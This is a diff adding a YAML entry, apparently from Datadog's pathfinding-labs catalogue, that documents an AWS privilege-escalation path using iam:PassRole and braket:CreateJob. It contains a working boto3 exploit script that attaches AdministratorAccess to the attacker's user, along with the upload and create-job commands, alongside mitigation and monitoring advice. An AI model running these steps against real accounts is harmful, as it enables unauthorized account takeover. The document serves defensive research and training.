@@ -1,0 +1,257 @@
+id: braket-001
+name: iam:PassRole + braket:CreateJob
+category: new-passrole
+services:
+  - iam
+  - braket
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM role to the Amazon Braket service
+    - permission: braket:CreateJob
+      resourceConstraints: No resource constraints required
+  additional:
+    - permission: braket:GetJob
+      resourceConstraints: Useful for polling job status to confirm execution
+    - permission: braket:SearchJobs
+      resourceConstraints: Helpful for discovering existing jobs and their states
+    - permission: s3:GetObject
+      resourceConstraints: Required on the attacker-controlled S3 bucket to read the pre-staged exploit script
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: A principal with `iam:PassRole` and `braket:CreateJob` can escalate privileges by creating an Amazon Braket Hybrid Job that passes an admin IAM role as the `jobExecutionRoleArn`. The Hybrid Job runs a containerized Python script using the ML instance infrastructure; the script calls `iam:AttachUserPolicy` using the job execution role's credentials to attach AdministratorAccess to the starting user.
+
+prerequisites:
+  admin:
+    - A role must exist that trusts braket.amazonaws.com to assume it
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+    - An S3 bucket must be accessible for job output storage (required by Braket)
+  lateral:
+    - A role must exist that trusts braket.amazonaws.com and has elevated permissions
+    - An S3 bucket must be accessible for job output storage
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        cat > /tmp/exploit.py << 'EOF'
+        import boto3
+        import os
+
+        def main():
+            iam = boto3.client("iam")
+            user = os.environ.get("ATTACKER_USER", "STARTING_USER")
+            iam.attach_user_policy(
+                UserName=user,
+                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+            )
+            print(f"AdministratorAccess attached to {user}")
+
+        if __name__ == "__main__":
+            main()
+        EOF
+
+        aws s3 cp /tmp/exploit.py s3://ATTACKER_BUCKET/exploit/exploit.py
+      description: Create a malicious Python exploit script and upload it to an attacker-controlled S3 bucket. Braket Hybrid Jobs require the entry point to be in S3.
+    - step: 2
+      command: |
+        aws braket create-job \
+          --job-name privesc-braket-job \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --algorithm-specification '{
+            "scriptModeConfig": {
+              "entryPoint": "exploit:main",
+              "s3Uri": "s3://ATTACKER_BUCKET/exploit/exploit.py",
+              "compressionType": "NONE"
+            }
+          }' \
+          --output-data-config '{"s3Path": "s3://ATTACKER_BUCKET/output"}' \
+          --instance-config '{
+            "instanceType": "ml.m5.large",
+            "instanceCount": 1,
+            "volumeSizeInGb": 1
+          }' \
+          --device-config '{"device": "arn:aws:braket:::device/quantum-simulator/amazon/sv1"}' \
+          --hyper-parameters '{"ATTACKER_USER": "STARTING_USER"}' \
+          --stopping-condition '{"maxRuntimeInSeconds": 300}'
+      description: Create a Braket Hybrid Job, passing the admin role as the jobExecutionRoleArn. The job container downloads and runs the exploit script with the admin role's credentials.
+    - step: 3
+      command: |
+        aws braket get-job \
+          --job-arn JOB_ARN \
+          --query 'status' \
+          --output text
+      description: Poll job status. Once the job reaches COMPLETED, the privilege escalation has succeeded and AdministratorAccess is attached to the starting user.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative Braket job roles** - Very rarely does a quantum computing job need administrative IAM access. Use the principle of least privilege and scope job execution roles to only the data and services the job legitimately requires.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificBraketRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "braket.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - Monitor CloudTrail for unusual Braket job creation followed by IAM policy attachment events
+  - Monitor CloudTrail for Braket job creation by principals who do not usually create Braket jobs
+  - Monitor CloudTrail for roles being passed to Braket that haven't been used before
+  - Monitor and alert on Braket job creation with privileged roles
+  - Regularly audit all IAM roles that trust braket.amazonaws.com and down-scope any with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by Amazon Braket - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonbraket.html"
+  - title: "IAM roles for Amazon Braket - Amazon Braket"
+    url: "https://docs.aws.amazon.com/braket/latest/developerguide/braket-manage-access.html"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/braket-001-iam-passrole+braket-createjob"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: |
+        The principal with iam:PassRole and braket:CreateJob permissions. Can be an IAM user or role.
+
+    - id: braket_job
+      label: New Braket Hybrid Job
+      type: resource
+      description: |
+        New Amazon Braket Hybrid Job created with a privileged IAM role passed as the jobExecutionRoleArn. The Hybrid Job runs a containerized Python script on ML instance infrastructure (e.g., ml.m5.large). The entry point script is sourced from an attacker-controlled S3 bucket and executes automatically when the job starts.
+
+    - id: exec_role
+      label: Job Execution Role
+      type: principal
+      description: |
+        IAM role passed to the Braket Hybrid Job as the jobExecutionRoleArn. The role must trust braket.amazonaws.com to assume it. Once the job starts, the container runs with this role's credentials automatically injected by the Braket service. The attacker's Python entry point script calls IAM APIs using these credentials.
+
+    - id: exploit_script
+      label: Python Entry Point Script
+      type: payload
+      color: '#99ccff'
+      description: |
+        Malicious Python script uploaded to an attacker-controlled S3 bucket and referenced as the job's entry point. When the Braket Hybrid Job runs, this script executes with the job execution role's credentials and calls iam:AttachUserPolicy to attach AdministratorAccess to the starting principal.
+
+        Example exploit script:
+        ```python
+        import boto3, os
+
+        def main():
+            iam = boto3.client("iam")
+            user = os.environ.get("ATTACKER_USER", "STARTING_USER")
+            iam.attach_user_policy(
+                UserName=user,
+                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+            )
+        ```
+
+        The script is specified via `--algorithm-specification scriptModeConfig.entryPoint` and the S3 URI in the CreateJob call.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        The job execution role has AdministratorAccess or equivalent permissions. The Python script successfully calls iam:AttachUserPolicy, elevating the starting principal to full administrative access across the AWS account.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        The job execution role has some elevated permissions but not full admin. The script can leverage these permissions for data exfiltration (S3, DynamoDB, Secrets Manager), security configuration changes, or additional privilege escalation paths.
+
+    - id: no_access
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        The job execution role only has minimal permissions (e.g., logs:PutLogEvents, s3:PutObject on a specific bucket). The privilege escalation provides limited value despite the script executing successfully.
+
+  edges:
+    - from: start
+      to: braket_job
+      label: iam:PassRole + braket:CreateJob
+      description: |
+        Create a new Braket Hybrid Job and pass the target admin role as the jobExecutionRoleArn. The job references the malicious Python script in S3 as its entry point.
+
+        Command:
+        ```bash
+        aws braket create-job \
+          --job-name privesc-braket-job \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --algorithm-specification '{
+            "scriptModeConfig": {
+              "entryPoint": "exploit:main",
+              "s3Uri": "s3://ATTACKER_BUCKET/exploit/exploit.py",
+              "compressionType": "NONE"
+            }
+          }' \
+          --output-data-config '{"s3Path": "s3://ATTACKER_BUCKET/output"}' \
+          --instance-config '{"instanceType": "ml.m5.large", "instanceCount": 1, "volumeSizeInGb": 1}' \
+          --device-config '{"device": "arn:aws:braket:::device/quantum-simulator/amazon/sv1"}' \
+          --hyper-parameters '{"ATTACKER_USER": "STARTING_USER"}' \
+          --stopping-condition '{"maxRuntimeInSeconds": 300}'
+        ```
+
+    - from: braket_job
+      to: exec_role
+      label: Job assumes jobExecutionRoleArn
+      description: |
+        The Braket Hybrid Job container starts and automatically assumes the IAM role specified in jobExecutionRoleArn. The role's temporary credentials are injected into the container environment and are available to the Python script via the boto3 default credential chain.
+
+    - from: exec_role
+      to: exploit_script
+      label: Script executes with role credentials
+      description: |
+        The Python entry point script runs within the job container using the execution role's credentials. The script uses boto3 (pre-installed in Braket containers) to make IAM API calls, with no additional credential configuration required.
+
+    - from: exploit_script
+      to: admin
+      label: If role has admin or IAM write permissions
+      branch: A
+      condition: admin
+      description: |
+        If the job execution role has AdministratorAccess or IAM write permissions (iam:AttachUserPolicy), the script successfully attaches AdministratorAccess to the starting principal. The privilege escalation is confirmed once the job reaches COMPLETED status.
+
+    - from: exploit_script
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: |
+        If the job execution role has elevated but non-admin permissions, the script can still perform meaningful actions such as reading sensitive data from S3 or Secrets Manager, modifying infrastructure, or staging further privilege escalation attempts.
+
+    - from: exploit_script
+      to: no_access
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: |
+        If the job execution role only has minimal permissions, the script cannot perform meaningful privilege escalation. The attack provides limited value despite the job executing successfully.
